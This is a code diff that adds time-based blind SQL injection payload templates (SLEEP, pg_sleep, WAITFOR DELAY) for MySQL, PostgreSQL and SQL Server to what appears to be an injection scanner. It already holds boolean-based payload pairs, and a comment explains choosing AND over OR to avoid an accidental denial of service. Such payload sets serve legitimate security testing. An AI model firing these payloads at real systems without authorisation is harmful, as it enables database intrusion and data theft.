@@ -64,3 +64,16 @@ BOOLEAN_PAIRS = [
     ("' AND {a}={a}-- -", "' AND {a}={b}-- -"),          # single quote + comment
     (") AND {a}={a}-- -", ") AND {a}={b}-- -"),          # inside parentheses
 ]
+
+# Time-based blind: (DBMS, template). {d} is the delay in seconds.
+# AND (not OR) is used on purpose: OR SLEEP() would sleep once for EVERY row in
+# the table, which could tie up the target database (an accidental DoS).
+TIME_PAYLOADS = [
+    ("MySQL/MariaDB", "' AND SLEEP({d})-- -"),
+    ("MySQL/MariaDB", " AND SLEEP({d})"),
+    ("MySQL/MariaDB", "\" AND SLEEP({d})-- -"),
+    ("PostgreSQL", "' AND 1=(SELECT 1 FROM pg_sleep({d}))-- -"),
+    ("PostgreSQL", " AND 1=(SELECT 1 FROM pg_sleep({d}))"),
+    ("Microsoft SQL Server", "'; WAITFOR DELAY '0:0:{d}'-- -"),
+    ("Microsoft SQL Server", "; WAITFOR DELAY '0:0:{d}'-- -"),
+]
